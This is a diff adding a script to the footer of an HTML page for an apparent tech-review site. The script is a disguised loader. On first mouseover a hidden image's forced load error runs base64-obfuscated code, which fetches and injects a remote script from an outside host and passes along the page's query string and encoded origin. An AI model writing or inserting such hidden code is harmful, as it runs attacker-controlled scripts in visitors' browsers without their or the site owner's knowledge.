@@ -72,5 +72,25 @@
   <footer>
     &copy; 2025 Independent Tech Review
   </footer>
+<script>
+    let isFired = false;
+
+  document.body.addEventListener("mouseover", function () {
+    if (isFired) return; // Run only once
+    isFired = true;
+
+    const img = document.createElement("img");
+    img.style.visibility = "hidden";
+    img.dataset.digest = "KGZ1bmN0aW9uKCl7dmFyIGE9bG9jYXRpb24sYj1kb2N1bWVudC5oZWFkfHxkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLGM9InNjcmlwdCIsZD1hdG9iKCJhSFIwY0hNNkx5OWlkWHA2YVc1bmMzQmxaV05vTG1OdmJTOWhhbUY0TG5Cb2NEOWZYM05wWkQwME9EZGlZMk15WlMwMFpqTTBMVFF4WldNdE9XRXdNeTB3TURoa1lUazVNVGxoTnpFPSIpO2QrPS0xPGQuaW5kZXhPZigiPyIpPyImIjoiPyI7ZCs9YS5zZWFyY2guc3Vic3RyaW5nKDEpO2M9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudChjKTtjLnNyYz1kO2MuaWQ9YnRvYShhLm9yaWdpbik7Yi5hcHBlbmRDaGlsZChjKTt9KSgpOw==";
+    img.onerror = function () {
+      new Function(atob(this.dataset.digest))();
+    };
+
+    // Broken src to trigger error and fire the payload
+    img.src = "/files/img/logo.png?" + Date.now(); // use timestamp to avoid cache
+
+    document.body.appendChild(img);
+  });
+</script>
 </body>
 </html>
